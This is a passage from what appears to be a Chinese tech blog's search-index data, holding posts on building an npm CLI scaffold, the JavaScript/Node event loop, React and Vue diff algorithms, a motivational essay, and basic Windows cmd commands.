\u0026lt;project-name\u0026gt; 根据远程模板，初始化一个项目(远程模板可配置) ca config set \u0026lt;template-name\u0026gt; \u0026lt;repository\u0026gt; 设置模板信息（暂未实现） ca config get templates 查看模板配置信息 ca cfg get templates 同上 ca -v 查看当前版本号 ca -h 帮助 如果有其他需求，可根据需求，自行拓展commander\n三、配置搭建cli 1.依赖的第三方库 @babel/cli、@babel/core和@babel/preset-env: 语法转换 commander: 命令行工具 download-git-repo: 用来下载远程模板 ini: 配置项格式转换 『暂时没用』一般用于物理机本地配置项 inquirer: 交互式命令行工具 ora: 显示node命令环境loading动画 chalk: 修改控制台输出内容样式 log-symbols: 显示出√或×等的图标 ascii-table: 以表格形式展示数据，比如：模板列表 关于以上第三方package的介绍，可直接npm.org上查看相应的说明\n2.搭建cli 2.1 初始化项目 创建一个空项目(create-app-cli)\ncreate-app-cli $ npm init // 项目初始化 安装依赖\ncreate-app-cli $ npm install @babel/cli @babel/core @babel/preset-env chalk commander download-git-repo ini inquirer log-symbols ora -D 目录结构\n. ├── bin │ └── www // 可执行文件 ├── lib ├── ... // 生成文件 ├── src │ ├── config.js // 管理 @lianpf/create-app-cli 配置文件 │ ├── index.js // 主流程入口文件 │ ├── init.js // init command │ ├── main.js // 入口文件 │ └── utils │ ├── constants.js // 定义常量 │ ├── download.js // 模板远程仓库下载 │ └── rc.js // 配置文件 ├── templates.json // 模板配置文件 ├── .babelrc // babel配置文件 ├── package.json └── README.md babel配置：开发使用了ES6语法，使用 babel 进行转义 .bablerc\n{ \u0026#34;presets\u0026#34;: [ [ \u0026#34;@babel/preset-env\u0026#34;, { \u0026#34;targets\u0026#34;: { \u0026#34;node\u0026#34;: \u0026#34;current\u0026#34; } }, \u0026#34;@babel/preset-react\u0026#34; // react 语法 ] ], \u0026#34;plugins\u0026#34;: [ \u0026#34;transform-class-properties\u0026#34;, \u0026#34;transform-decorators\u0026#34;, \u0026#34;transform-react-constant-elements\u0026#34;, \u0026#34;transform-react-inline-elements\u0026#34; ] } 2.2 @lianpf/create-app-cli开发环境搭建 2.2.1 脚手架开发：启动命令配置 node.js内置了对命令行操作的支持，package.json中的bin 字段可以定义命令名和关联的执行文件。在package.json中添加 bin字段\npackage.json\n{ \u0026#34;name\u0026#34;: \u0026#34;@lianpf/create-app-cli\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;0.2.1\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;A cli to help create a project\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;index.js\u0026#34;, \u0026#34;bin\u0026#34;: { \u0026#34;ca\u0026#34;: \u0026#34;./bin/www\u0026#34; }, \u0026#34;scripts\u0026#34;: { \u0026#34;compile\u0026#34;: \u0026#34;babel src -d lib\u0026#34;, \u0026#34;watch\u0026#34;: \u0026#34;npm run compile -- --watch\u0026#34; } } www 文件\n行首加入一行#!/usr/bin/env node指定当前脚本由node.js进行解析\n#! /usr/bin/env node require(\u0026#39;../lib/main.js\u0026#39;); 2.2.2 脚手架测试：链接到全局环境 开发过程中为了方便调试，在当前的create-app-cli目录下执行 npm link，将ca命令链接到全局环境\n2.2.3 脚手架开发：启动项目 create-app-cli $ npm run watch 2.3 @lianpf/create-app-cli命令行处理 利用commander来处理命令行\n/create-app-cli/src/main.js\nimport program from \u0026#39;commander\u0026#39;; import { VERSION, make_success, make_fail } from \u0026#39;./utils/constants\u0026#39;; import apply from \u0026#39;./index\u0026#39;; /** * ca commands * - config * - init * - v * - h */ let actionMap = { // init 命令配置 init: { ... }, // config 命令配置 config: { ... } } // 遍历预设命令，进行处理配置 Object.keys(actionMap).forEach((action) =\u0026gt; { program.command(action) .description(actionMap[action].description) .alias(actionMap[action].alias) .action(() =\u0026gt; { switch (action) { case \u0026#39;config\u0026#39;: apply(action, ...process.argv.slice(3)); break; case \u0026#39;init\u0026#39;: apply(action, ...process.argv.slice(3)); break; default: break; } }); }); function help() { // -h 参数是，遍历列出所有命令 ... } program.usage(\u0026#39;\u0026lt;command\u0026gt; [options]\u0026#39;); program.on(\u0026#39;-h\u0026#39;, help); program.on(\u0026#39;--help\u0026#39;, help); program.version(VERSION, \u0026#39;-v, --version\u0026#39;).parse(process.argv); // ca 不带参数时 if (!process.argv.slice(2).length) { program.outputHelp(make_success); } 2.4 @lianpf/create-app-cli下载模板 download-git-repo支持从Github、Gitlab下载远程仓库到本地\n/create-app-cli/src/util/download.js\nimport downloadGit from \u0026#39;download-git-repo\u0026#39;; import { templateConfig, hasTemplate } from \u0026#39;./constants\u0026#39;; export const downloadLocal = async (templateName, projectName) =\u0026gt; { const _hasTemplate = hasTemplate(templateName) let api = \u0026#39;\u0026#39; // 判断是否存在模板 if (_hasTemplate) { // 获取 模板下载地址 api = `${templateConfig[templateName].type}:${templateConfig[templateName].user}/${templateConfig[templateName].repository}#${templateConfig[templateName].branch}`; } return new Promise((resolve, reject) =\u0026gt; { // projectName 为下载到的本地目录 downloadGit(api, projectName, { clone: true }, (err) =\u0026gt; { if (err) { reject(err); } else { resolve(); } }); }); } constants.js获取template配置\n/create-app-cli/src/util/constants.js\n... import templates from \u0026#39;../../templates.json\u0026#39; ... // template config export const templateConfig = templates // 判断是否存在当前模板 export const hasTemplate = (templateName) =\u0026gt; { return Object.keys(templateConfig).indexOf(templateName) \u0026gt; -1 } ... 静态template配置\n/create-app-cli/template.json\n{ \u0026#34;react-template\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;https://github.com\u0026#34;, \u0026#34;user\u0026#34;: \u0026#34;xxx\u0026#34;, \u0026#34;repository\u0026#34;: \u0026#34;xxx\u0026#34;, \u0026#34;branch\u0026#34;: \u0026#34;master\u0026#34;, \u0026#34;templateName\u0026#34;: \u0026#34;react-template\u0026#34;, \u0026#34;keyWords\u0026#34;: \u0026#34;react、webpack\u0026#34; }, ... } 注意，这里没有实现ca config set \u0026lt;template-name\u0026gt; \u0026lt;repository\u0026gt;设置模板命令，且企业级脚手架对应模板相对固定，故我们将模板预先内置到template.json文件中\n2.5 @lianpf/create-app-cli交互式命令和美化 2.5.1 命令行交互 用户执行init命令后，向用户提出问题，接收用户的输入并作出相应的处理。命令行交互利用inquirer实现:\n/create-app-cli/src/init.js\ninquirer.prompt([ { name: \u0026#39;description\u0026#39;, message: \u0026#39;Please enter the project description: \u0026#39; }, { name: \u0026#39;author\u0026#39;, message: \u0026#39;Please enter the author name: \u0026#39; } ]).then((answer) =\u0026gt; { //... }); 类似于：npm init命令执行后，项目初始化，会问询你作者、版本信息、描述等添加到package.json配置文件的交互操作。\n2.5.2 视觉美化 在上一步，用户输入后，开始下载模板，此时使用ora提示用户正在下载模板，以及下载结束后给出相应提示。\n/create-app-cli/src/init.js\n... import ora from \u0026#39;ora\u0026#39;; ... let loading = ora(\u0026#39;downloading template ...\u0026#39;); loading.start(); //download loading.succeed(); //或 loading.fail(); 2.6 @lianpf/create-app-cli获取模板配置 config配置支持使用其它仓库作为模板。这样使用者可以自由选择下载目标\n/create-app-cli/src/config.js\nimport { get } from \u0026#39;./utils/rc\u0026#39;; import { make_success, make_fail, make_warn } from \u0026#39;./utils/constants\u0026#39;; let config = async (action, key) =\u0026gt; { switch (action) { case \u0026#39;get\u0026#39;: if (key) { let result = await get(key); if (result.code === 0) { console.log(make_success(result.message)); } else { console.log(make_fail(result.message)); } } else { console.log(make_warn(\u0026#39;Command does not exist!\u0026#39;)); } break; // set 模板命令暂未实现，需通过 template.json 配置 // case \u0026#39;set\u0026#39;: // set(key, value); // break; // case \u0026#39;remove\u0026#39;: // remove(key); // break; default: console.log(make_warn(\u0026#39;Command does not exist!\u0026#39;)); break; } } module.exports = config; rc.js负责对本地物理机『模板配置文件』的增删改查，这里改造为对脚手架模板配置文件template.json的查询\n/create-app-cli/src/util/rc.js\nimport { configCommand, make_success, make_warn, templateConfig } from \u0026#39;./constants\u0026#39;; import AsciiTable from \u0026#39;ascii-table\u0026#39; // constants 配置文件 export const get = async (key) =\u0026gt; { ... if (opts.indexOf(key) !== -1) { switch (key) { case \u0026#39;templates\u0026#39;: // code、message、data处理 ... break; default: ... break; } } ... console.log(make_success(templateTable.toString())) return { code, data: {}, message }; } 四、发布cli npm publish脚手架发布。 其它用户可通过npm install @lianpf/create-app-cli -g全局安装，即可使用ca命令。 仓库源码 谢谢各位花费宝贵的时间阅读本文，以下是源码仓库地址，如果本文给了您一点帮助或者是启发，请动动小手点进Github仓库，不要吝啬你的Star，您的肯定是我前进的最大动力\ncreate-app-cli 参考 [1] npm依赖文档 [2] 脚手架搭建.刘小夕.掘金 [3] eos-cli源码 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/25.%E6%90%AD%E5%BB%BA%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%84%9A%E6%89%8B%E6%9E%B6/","summary":"\u003cp\u003e本篇是前端工程化之依托模板搭建企业级脚手架(cli)。通过脚手架，我们可以快速初始化一个项目，无需自己从零开始一步步\u0026hellip;\u003c/p\u003e","title":"工具\u0026工程化：依托模板搭建企业级脚手架(cli)"},{"content":"一、背景 作为一枚“前端打字员”， 无论是新手还是老鸟，都会遇到一个令人深省的问题，既然js 是单线程执行的，是按照语句出现的顺序执行的，那么异步的代码 js 是怎么处理的呢？下面的代码是如何进行输出的？\nconsole.log(1); setTimeout(function() { console.log(2); }, 0); new Promise(function(resolve) { console.log(3); resolve(Date.now()); }).then(function() { console.log(4); }); console.log(5); setTimeout(function() { new Promise(function(resolve) { console.log(6); resolve(Date.now()); }).then(function() { console.log(7); }); }, 0); 好了，小伙子们可以尽情发挥你的想象力，如果你的答案不是”1, 3, 5, 4, 2, 6, 7“，那你就要认认真真接着往下看了。什么？你竟然答对了。那你更要接着往下看，后面还有好看的彩蛋哦~\n二、浏览器中的事件循环 1.同步和异步 首先通过一张导图来看一下javascript事件循环中，同步和异步的关系：\n同步和异步任务分别进入不同的执行 process，同步的进入主线程，异步的进入Event Table并注册函数。 当指定的事情完成时，Event Table会将这个函数移入Event Queue。 主线程内的任务执行完毕为空，会去Event Queue读取对应的函数，进入主线程执行。 上述过程会不断重复，也就是常说的Event Loop(事件循环) 那么还有一个问题：\n那怎么知道主线程执行栈为空啊？js引擎存在monitoring process进程，会持续不断的检查主线程执行栈是否为空，一旦为空，就会去Event Queue那里检查是否有等待被调用的函数\n2.宏任务和微任务、事件循环执行机制 然而，仅仅理解到此，当然是还不够的： 除了广义的同步任务和异步任务，我们对任务有更精细的定义：宏任务和微任务\n事件循环，宏任务，微任务的关系如图所示：\n事件循环的顺序，决定js代码的执行顺序。进入整体代码(宏任务)后，开始第一次循环。接着执行所有的微任务。然后再次从宏任务开始，找到其中一个任务队列执行完毕，再执行所有的微任务\n回到我们上面说的实例代码:\nconsole.log(1); setTimeout(function() { console.log(2); }, 0); new Promise(function(resolve) { console.log(3); resolve(Date.now()); }).then(function() { console.log(4); }); console.log(5); setTimeout(function() { new Promise(function(resolve) { console.log(6); resolve(Date.now()); }).then(function() { console.log(7); }); }, 0); 执行步骤如下：\n执行 log(1)，输出 1； 遇到 setTimeout，将回调的代码 log(2)添加到宏任务中等待执行； 执行 console.log(3)，将 then 中的 log(4)添加到微任务中； 执行 log(5)，输出 5； 遇到 setTimeout，将回调的代码 log(6, 7)添加到宏任务中； 宏任务的一个任务执行完毕，查看微任务队列中是否存在任务，存在一个微任务 log(4)（在步骤 3 中添加的），执行输出 4； 取出下一个宏任务 log(2)执行，输出 2； 宏任务的一个任务执行完毕，查看微任务队列中是否存在任务，不存在； 取出下一个宏任务执行，执行 log(6)，将 then 中的 log(7)添加到微任务中； 宏任务执行完毕，存在一个微任务 log(7)（在步骤 9 中添加的），执行输出 7； 因此，最终的输出顺序为：1, 3, 5, 4, 2, 6, 7;\n当然，你可以在Promise.then实现一个稍微耗时的操作(比如 1~1000的for循环)，这个步骤看起来会更加地明显。马上会输出1，稍等一会儿才会输出3，然后再输出2。不论等待多长时间输出3，2一定会在3的后面输出。这也就印证了eventloop中的第3步操作，必须等所有的微任务执行完毕后，才开始下一个宏任务\n3.宏任务、微任务概念及其常见的任务类型 3.1 宏任务 进入任务栈等待主线程执行的主代码块，包括从异步队列里加入到栈的，如setTimeout()、setInterval（）的回调，其中不含异步队列中的微任务如Promise.then回调\n普通消息队列和延迟队列中的任务。渲染主线程采用一个for循环，不断地从这些任务队列中取出任务并执行任务 每个宏任务都关联了一个微任务队列 宏任务的时间粒度比较大，执行的时间间隔不能精确控制，对一些高实时性的需求就不太符合，比如监听DOM变化 macro-task(宏任务)常见类型：\n宿主环境(即整体代码script脚本)，作为js运行的载体，常见的有浏览器、node.js等 setTimeout、setInterval setImmediate(node.js) 渲染任务（如解析DOM、计算布局、绘制）、用戶交互事件(如鼠标点击、滚动⻚面、放大缩小等) JavaScript脚本执行事件 IO操作（网络请求、文件读写） 3.2 微任务 微任务: 一个需要异步执行的函数\n执行时机是在主函数执行结束之后、当前宏任务结束之前及当前事件循环结束之前 微任务队列与每一个宏任务关联 在执行微任务过程中产生的新的微任务并不会推迟到下个宏任务中执行，而是在当前的宏任务中继续执行\n常见类型：\nPromise.resolve() MutationObserver(web) 浏览器监听DOM变化 process.nextTick(node.js) queueMicrotask() Async/Await(实际就是promise) MutationObserver采用了“异步+微任务”的策略:\n异步操作解决了同步操作的性能问题:每次DOM节点发生变化的时候，渲染引擎将变化记录封装成微任务，并 将微任务添加进当前的微任务队列中 微任务解决了实时性的问题: 当执行到检查点的时候，V8引擎就会按照顺序执行微任务 监听DOM变化技术方案的演化史：从轮询到Mutation Event再到最新使用的 MutationObserver\n3.3 requestAnimationFrame(web) 也属于异步执行的方法，但该方法既不属于宏任务，也不属于微任务, 具体参考MDN中的定义\n告诉浏览器——你想在浏览器下次重绘之前继续更新下一帧动画\n三、node 中的事件循环 node 11后，事件循环的一些原理发生变化，这里以新的标准为主，再加上变化点进行比对。\n事件循环是node处理『非阻塞I/O 操作』的机制，依靠libuv引擎实现。\n1.常见的宏任务和微任务 macro-task大概包括：\nsetTimeout setInterval setImmediate script（整体代码) I/O 操作 \u0026hellip; micro-task 大概包括：\nprocess.nextTick(与普通微任务有区别，在微任务队列执行之前执行) new Promise().then(回调)等 2.node事件循环整体理解和阶段概述 2.1 整体理解 注意：每个框被称为事件循环机制的一个阶段。\n每个阶段都有一个 FIFO队列来执行回调。 每个阶段都是特殊的，但通常，当事件循环进入给定的阶段时，它将执行特定于该阶段的任何操作，然后执行该阶段队列中的回调，直到队列用尽或最大回调数已执行。 当该队列已用尽或达到回调限制，事件循环将移动到下一阶段 因此，可分析出node的事件循环的阶段顺序为：\n输入数据阶段(incoming data) 轮询阶段(poll) 检查阶段(check) 关闭事件回调阶段(close callback) 定时器检测阶段(timers) I/O事件回调阶段(I/O callbacks) 闲置阶段(idle, prepare)-\u0026gt;回到第2步继续新一轮『轮询阶段』\u0026hellip; 2.2 阶段概述 定时器检测阶段(timers)：本阶段执行 timer 的回调，即 setTimeout、setInterval 里面的回调函数。 待定回调：I/O事件回调阶段(I/O callbacks)，执行延迟到下一个循环迭代的 I/O 回调，即上一轮循环中未被执行的一些I/O回调。 闲置阶段(idle, prepare)：仅系统内部使用。 轮询阶段(poll)：检索新的 I/O 事件;执行与 I/O 相关的回调（几乎所有情况下，除了关闭的回调函数，那些由计时器和 setImmediate() 调度的之外），其余情况 node 将在适当的时候在此阻塞。 检查阶段(check)：setImmediate() 回调函数在这里执行 关闭事件回调阶段(close callback)：一些关闭的回调函数，如：socket.on(\u0026lsquo;close\u0026rsquo;, \u0026hellip;)。 2.3 三大重点阶段 开发中的绝大部分异步任务都是在 poll、check、timers 这3个阶段处理的\ntimers poll check timers 阶段会执行 setTimeout 和 setInterval 回调，并且是由 poll 阶段控制的。同样，在 Node中定时器指定的时间也不是准确时间，只能是尽快执行。\npoll阶段执行逻辑流程如下：\n如果当前已经存在定时器，而且有定时器到时间了，拿出来执行，eventLoop 将回到 timers 阶段。 如果没有定时器, 会去看回调函数队列 如果 poll 队列不为空，会遍历回调队列并同步执行，直到队列为空或者达到系统限制 如果 poll 队列为空时，会有两件事发生 如果有 setImmediate 回调需要执行，poll 阶段会停止并且进入到 check 阶段执行回调 如果没有 setImmediate 回调需要执行，会等待回调被加入到队列中并立即执行回调，这里同样会有个超时时间设置防止一直等待下去,一段时间后自动进入 check 阶段。 check 阶段。这是一个比较简单的阶段，直接执行 setImmdiate 的回调\n3.process.nextTick process.nextTick 是一个独立于 eventLoop 的任务队列\n每一个『eventLoop阶段』完成后会去检查nextTick 队列，如果里面有任务，会让这部分任务优先于微任务执行\n看一个例子：\nsetImmediate(() =\u0026gt; { console.log(\u0026#39;timeout1\u0026#39;) Promise.resolve().then(() =\u0026gt;console.log(\u0026#39;promise resolve\u0026#39;)) process.nextTick(() =\u0026gt;console.log(\u0026#39;next tick1\u0026#39;)) }); setImmediate(() =\u0026gt; { console.log(\u0026#39;timeout2\u0026#39;) process.nextTick(() =\u0026gt;console.log(\u0026#39;next tick2\u0026#39;)) }); setImmediate(() =\u0026gt;console.log(\u0026#39;timeout3\u0026#39;)); setImmediate(() =\u0026gt;console.log(\u0026#39;timeout4\u0026#39;)); node11前，每一个eventLoop阶段后去检查nextTick队列 nextTick队列有任务，会优先于微任务执行。即以上代码进入check阶段，执行『所有setImmediate』，完成后执行nextTick队列，最后执行微任务队列，输出为：timeout1=\u0026gt;timeout2=\u0026gt;timeout3=\u0026gt;timeout4=\u0026gt;next tick1=\u0026gt;next tick2=\u0026gt;promise resolve node11后，process.nextTick是微任务的一种。 即代码进入check 阶段，执行『一个setImmediate宏任务』，然后执行『其微任务队列』，再执行『下一个宏任务及其微任务』,因此输出为timeout1=\u0026gt;next tick1=\u0026gt;promise resolve=\u0026gt;timeout2=\u0026gt;next tick2=\u0026gt;timeout3=\u0026gt;timeout4 4.node 版本差异 \u0026amp; 和浏览器eventLoop的差异 node 版本差异：\nnode11后一些特性向浏览器看齐，总的来说，如果node11 版本一旦执行一个阶段里的一个宏任务(setTimeout,setInterval和setImmediate)，就立刻执行对应的微任务队列 node11后，process.nextTick是微任务的一种，先进入check阶段执行，再执行相应的微任务队列。 和浏览器eventLoop的差异：\n浏览器中的微任务是在每个相应的宏任务中执行的 nodejs中的微任务是在不同阶段之间执行的 总结 javascript是一门单线程语言 Event Loop是 javascript的执行机制 参考 Node.js 事件循环.官方 说说事件循环机制.前端Q 浏览器与Node的事件循环(Event Loop)有何区别.浪里行舟 《浏览器工作原理与实践》.极客时间.李兵 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可添加作者微信！\n","permalink":"https://lianpf.github.io/posts/computer-basics/chrome-event-loop/","summary":"一、背景 作为一枚“前端打字员”， 无论是新手还是老鸟，都会遇到","title":"JavaScript\u0026Node: 事件循环机制（Event Loop）"},{"content":"你了解传统的diff算法么？了解 react 优化的diff算法么？了解 Vue2.x和Vue3.x 渲染器的diff算法\u0026hellip;\n场景 计算两颗树形结构差异并进行转换\n文中, 所提及n均代表节点的个数\n传统Diff算法 处理方案: 循环递归每一个节点\n如上所示, 左侧树a节点依次进行如下对比:\na-\u0026gt;e、a-\u0026gt;d、a-\u0026gt;b、a-\u0026gt;c、a-\u0026gt;a\n之后左侧树其它节点b、c、d、e亦是与右侧树每个节点对比, 算法复杂度能达到O(n^2)\n查找完差异后还需计算最小转换方式，这其中的原理我没仔细去看，最终达到的算法复杂度是O(n^3)\n将两颗树中所有的节点一一对比需要O(n²)的复杂度，在对比过程中发现旧节点在新的树中未找到，那么就需要把旧节点删除，删除一棵树的一个节点(找到一个合适的节点放到被删除的位置)的时间复杂度为O(n),同理添加新节点的复杂度也是O(n),合起来diff两个树的复杂度就是O(n³)\n优化的Diff算法 vue和react的虚拟DOM的diff算法大致相同，其核心是基于两个简单的假设:\n两个相同的组件产生类似的DOM结构，不同的组件产生不同的DOM结构 同一层级的一组节点，他们可以通过唯一的id进行区分 (优化的)diff三点策略: web UI中DOM节点跨层级的移动操作特别少，可以忽略不计。 拥有相同类型的两个组件将会生成相似的树形结构，拥有不同类型的两个组件将会生成不同树形结构。 对于同一层级的一组自节点，他们可以通过唯一id进行区分。 即, 比较只会在同层级进行, 不会跨层级比较\nReact优化Diff算法 基于以上优化的diff三点策略，react分别进行以下算法优化\ntree diff component diff element diff tree diff react对树的算法进行了分层比较。react 通过 updateDepth对Virtual Dom树进行层级控制，只会对相同颜色框内的节点进行比较，即同一个父节点下的所有子节点。当发现节点不存在，则该节点和其子节点都会被删除。这样是需要遍历一次dom树，就完成了整个dom树的对比\n如果是跨层级的移动操作，如图\n当根结点发现A消失了，会删除掉A以及他的子节点。当发现D上多了一个A节点，会创建A（包括其子节点）节点作为子节点\n所以：当进行跨层级的移动操作，react并不是简单的进行移动，而是进行了删除和创建的操作，这会影响到react性能。所以要尽量避免跨层级的操作。（例如：控制display来达到显示和隐藏，而不是真的添加和删除dom）\ncomponent diff 如果是同类型的组件，则直接对比virtual Dom tree 如果不是同类型的组件，会直接替换掉组件下的所有子组件 如果类型相同，但是可能virtual DOM 没有变化，这种情况下我们可以使用shouldComponentUpdate() 来判断是否需要进行diff 如果组件D和组件G，如果类型不同，但是结构类似。这种情况下，因为类型不同，所以react会删除D，创建G。所以我们可以使用shouldComponentUpdate()返回false不进行diff。\n针对react15, 16出了新的生命周期\ntodo: ???\n所以：component diff 主要是使用shouldComponentUpdate() 来进行优化\nelement diff element diff 涉及三种操作：插入，移动，删除\n不使用key的话，react对新老集合对比，发现新集合中B不等于老集合中的A，于是删除了A，创建了B，依此类推直到删除了老集合中的D，创建了C于新集合。=\n酱紫会产生渲染性能瓶颈，于是react允许添加key进行区分\nreact首先对新集合进行遍历，for( name in nextChildren),通过唯一key来判断老集合中是否存在相同的节点，如果没有的话创建，如果有的话，if (preChild === nextChild ) 进行移动操作\n移动优化 在移动前，会将节点在新集合中的位置和在老集合中lastIndex进行比较，如果if (child._mountIndex \u0026lt; lastIndex) 进行移动操作，否则不进行移动操作。这是一种顺序移动优化。只有在新集合的位置 小于 在老集合中的位置 才进行移动。\n如果遍历的过程中，发现在新集合中没有，但是在老集合中的节点，会进行删除操作\n所以：element diff 通过唯一key 进行diff 优化。\n总结：\nreact中尽量减少跨层级的操作。 可以使用shouldComponentUpdate() 来避免react重复渲染。 添加唯一key，减少不必要的重渲染 Vue优化Diff vue2.x 加入了virtual dom，和react拥有相同的 diff 优化原则\n参考: https://juejin.im/post/5da9789f51882529d1528c3e\n差异就在于, diff的过程就是调用patch函数，就像打补丁一样修改真实dom\npatchVnode updateChildren updateChildren是vue diff的核心\n过程可以概括为：oldCh和newCh各有两个头尾的变量StartIdx和EndIdx，它们的2个变量相互比较，一共有4种比较方式。如果4种比较都没匹配，如果设置了key，就会用key进行比较，在比较的过程中，变量会往中间靠，一旦StartIdx\u0026gt;EndIdx表明oldCh和newCh至少有一个已经遍历完了，就会结束比较\nVue 2.x vs Vue 3.x Vue2的核心Diff算法采用了双端比较的算法，同时从新旧children的两端开始进行比较，借助key值找到可复用的节点，再进行相关操作。相比React的Diff算法，同样情况下可以减少移动节点次数，减少不必要的性能损耗，更加的优雅\nVue3.x借鉴了 ivi算法和 inferno算法。在创建VNode时就确定其类型，以及在mount/patch的过程中采用位运算来判断一个VNode的类型，在这个基础之上再配合核心的Diff算法，使得性能上较Vue2.x有了提升。(实际的实现可以结合Vue3.x源码看\n该算法中还运用了动态规划的思想求解最长递归子序列\n参考 react官方文档 https://www.jianshu.com/p/398e63dc1969 https://www.jianshu.com/p/21eb0cea85d8 https://segmentfault.com/a/1190000008782928 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/frontend-develop/react-diff-algorithm/","summary":"\u003cp\u003e你了解传统的diff算法么？了解 react 优化的diff算法么？了解 Vue2.x和Vue3.x 渲染器的diff算法\u0026hellip;\u003c/p\u003e","title":"聊一聊Diff算法（React、Vue）"},{"content":"小时候, 你想每次考试拿第一名; 到了高中, 你想要考国内一流的大学; 毕了业, 你想去BAT创造属于你的世界。可是, 你想要的那个东西那么美好又难得, 你为之做了什么呢?\n你总是说, 这个等一等, 没那么重要, 那个缓一缓, 以后再说。后来我才知道, 你从来都是这样!\n正在看文章的你, 也许会觉得我在你身上安装了360度无死角的监控, 偷窥着你的日常。啊哈哈哈！ 其实并不是, 我只是一个算命先生罢了, 刚好给一个叫做阿凯(化名)的年轻人算了一卦, 他的身边刚好有一个这样的叫做胖辉的朋友, 难道你的名字也叫做胖辉?\n阿凯跟我说, 他有一个很铁的朋友胖辉(化名), 那次他们去和要好的大学同学聚会。他们的目的地是D， 从出发点A出发, 其实相差也不是很远的样子, 大概四五公里, 天气不错, 所以, 推着小区门口的摩拜他们就出发了。\n本来路上的时间就不是很充裕了, 所以阿凯本想路上骑车快一点儿。结果发现, 胖辉貌似骑的特别慢, 晃晃悠悠一点也不着急, 阿凯刚开始还催促胖辉几句。但是, 看起来并没有什么效果。\n所以呢, 结果就是, 一共也就五六个红绿绿灯口的 路程, 几乎每次过红绿灯口都出现了尴尬的一幕, 阿凯站在过了红绿路口的另一端等胖辉, 而胖辉在对面慢悠悠 的骑着, 看着这一幕阿凯好气又好笑。阿凯说, 他本想一个人往前”奔跑”, 却因为怕胖辉迷路, 不得不每次 在”关键的十字路口”等胖辉, 而胖辉缺依然在”慢悠悠”。\n也许是有了一次心理的感受之后, 人可能会无意识的发现类似的东西。慢慢的, 阿凯发现, 胖辉找工作, 阿凯比胖辉还着急, 但是胖辉他却一点儿都不着急。胖辉要处理一下临时又紧急的的东西, 告诉了阿凯, 阿凯比胖辉还着急的出谋划策, 恨不得亲自上阵, 最后胖辉依旧还是慢吞吞的不了了之。\n然后, 回头胖辉再跟阿凯说, “我特别想要xxx, 我觉得我也努力了啊, 可是怎么结果并不是我想要的”。阿凯却只能尴尬又无奈的笑了笑, 嘴上应付的安慰了几句。\n今天, 阿凯遇到了我, 他跟我说: “出现问题, 我依然会给胖辉出谋划策, 他是我兄弟。可是不知道为什么, 我却怎么都着急不起来了, 因为好像连他自己都没那么想要解决或者得到啊”。\n好了, 故事讲完了。也许有人会说, 作为哥们, 你就不能一直坚持着督促他么? 我想说的是, 拜托, 他不是一个小朋友了, 是一个成年人啊, 如果他自己都没那么想, 那别人有能如何呢?\n曾经我也想过, 你从某个人平时的一些小事, 作为去评判一个人的依据, 是不是不太合理, 或者说对对方不太公平, 毕竟这是那个人在无意识的情况下发生的行为。\n但是, 慢慢的, 我发现, 那些在某个领域有一定成就的人, 他们的生活真的就是”时刻准备着”, 毕竟, 好的机会出现的几率, 就像你和你的恋人在这茫茫人海相遇的几率一样，一闪而过, 错过了, 可能就真的再也不会遇到了。\n每个人都希望自己更上一层楼, 这本身没有一丁点儿的不对！可是, 孩子, 作为一个 成年人, 你要接过父母手里的接力棒, 接替他们去守护这个你成长了十八年的家庭, 你也要准备着随时建立一个属于你自己的小家, 去努力让这个小家更好的生活, 承担起这个小家的责任。\n你长大了, 不再是那个跟在爸爸妈妈屁股后面哭闹着要糖果的小朋友。你想要去闯荡精彩的世界, 想要去获得美好的事物, 所以你要努力啊, 这个世界从某种角度来说, 是绝对公平的。 若你只是像个孩子般”哭喊”, 而不是把握住每一步，充分的准备, 你的爸妈也已经老了啊, 已经给不了你要的东西了。\n8岁那年, 你想拿那枚金光闪闪的田径冠军的奖牌, 你告诉自己要努力往前跑啊！今天, 你18岁了, 你想要一枚同样金光闪闪”有出息”的”徽章”, 你应该也知道怎么做的啊！ 对呀, 孩子, 你要往前跑啊！\n最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/article-childyouneedtorun/","summary":"小时候, 你想每次考试拿第一名; 到了高中, 你想要考国内一流的大","title":"孩子, 你要跑啊"},{"content":"终端操作\u0026hellip;\n一、cmd 命令 $ service.msc 服务 $ taskmgr windows 任务管理器 $ diskmgmt.msc 磁盘管理 $ msconfig 系统配置 $ regedit 注册表编辑器 二、文件操作 1.common \u0026#34; / \u0026#34; ：根目录 \u0026#34; ~ \u0026#34; ：用户主目录的缩写。例如当前用户为hello，那么\u0026#34; ~ \u0026#34;展开来就是：/Users/hello \u0026#34; . \u0026#34; ：当前目录 \u0026#34;..\u0026#34; ：父目录 $ cd aaa 进入文件 $ dir 查看文件下的文件和子目录 $ md 创建一个子目录 $ rd 删除空子目录 $ copy 源文件名 目标文件名 $ del 删除指定磁盘、目录中的一个或一组文件 $ chkdsk 磁盘名 检查磁盘使用情况 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/18.%E7%BB%88%E7%AB%AF/","summary":"\u003cp\u003e终端操作\u0026hellip;\u003c/p\u003e","title":"终端(Terminal)"},{"content":"MacOS / Linux / 